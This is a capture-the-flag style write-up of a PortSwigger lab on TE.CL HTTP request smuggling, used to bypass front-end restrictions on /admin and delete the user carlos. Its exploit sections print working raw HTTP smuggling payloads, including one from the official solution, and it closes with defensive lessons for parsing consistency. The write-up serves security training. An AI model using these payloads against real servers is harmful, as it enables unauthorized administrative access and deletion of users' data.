# Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

**Category:** HTTP Request Smuggling
**Difficulty:** PRACTITIONER
**Lab:** https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl

The same front-end-can't-see-what-it-never-parsed logic from the CL.TE bypass lab applies equally to TE.CL — the access control being bypassed doesn't care which length header caused the desync, only that a desync exists at all. This lab repeats the exercise with the trust relationship flipped: front-end honors `Transfer-Encoding`, back-end honors `Content-Length`.

## The Target

Identical restriction to the CL.TE version: `/admin` is only reachable with `Host: localhost` attached, enforced at the front-end before the request ever reaches application logic capable of deleting the user `carlos`.

## The Investigation

The exploitation logic carries over directly from the TE.CL confirmation lab — smuggle a complete request wrapped in a correctly-sized chunk, using `CL = len(chunk_size_hex) + 2` to truncate the back-end's read right after the chunk-size line. The only change from a confirmation probe is what gets smuggled: instead of a throwaway 404 check, the smuggled request targets `/admin` with the required `Host: localhost` header attached directly in its own header block:

```
GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

As with the CL.TE version, the admin panel's response reveals a delete link scoped to `carlos`, which we extract and re-smuggle in a second request to complete the deletion.

## The Exploit

First, access the admin panel via a TE.CL smuggle to recover the delete link:

```
POST / HTTP/1.1
Host: TARGET
Content-Length: 3
Transfer-Encoding: chunked

<chunk-size>
GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
0

```

Then, with the delete link for `carlos` parsed out of the merged admin panel response, we repeated the same TE.CL smuggle with the request retargeted at that delete path, still carrying `Host: localhost`. A few repeated sends over fresh keep-alive connections — needed to account for which back-end connection a given request actually lands on — confirmed the deletion and solved the lab.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's solution follows the identical trial-and-error arc as their CL.TE writeup, adapted for TE.CL's chunk-wrapping requirement. Their first attempt smuggles `POST /admin` without `Host: localhost` and gets rejected; a second attempt adds the header but is blocked by a `Host` conflict; the working version places the extra headers inside the smuggled request body:

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

That's the same shape we converged on — a complete smuggled request carrying its own `Host: localhost`, wrapped inside a chunk with an outer `Content-Length` short enough to truncate the back-end's read. The recurring difference across this whole series holds here too: their solution is a sequence of manual Repeater attempts that surface each failure mode explicitly, ours is a script that applied the lesson already learned from the earlier labs and produced the working payload on the first send. It's worth noting that reaching a working payload without replaying the failed intermediate attempts isn't a shortcut unique to scripting — it's just what happens once you already know the answer; a manual tester encountering this cold would go through the same discovery process PortSwigger's walkthrough documents.

## What This Teaches Us

Testing both CL.TE and TE.CL variants against the same access-control bypass goal drives home that request smuggling defenses have to be variant-agnostic — a front-end that's hardened against CL.TE specifically (say, by dropping `Transfer-Encoding` support entirely) can still be wide open to TE.CL if the back-end's own parsing behavior creates the opposite discrepancy. The actual fix has nothing to do with picking the "safer" header to trust; it's ensuring both servers in the chain resolve `Content-Length`/`Transfer-Encoding` ambiguity identically, or reject the ambiguous request outright before either one acts on it.
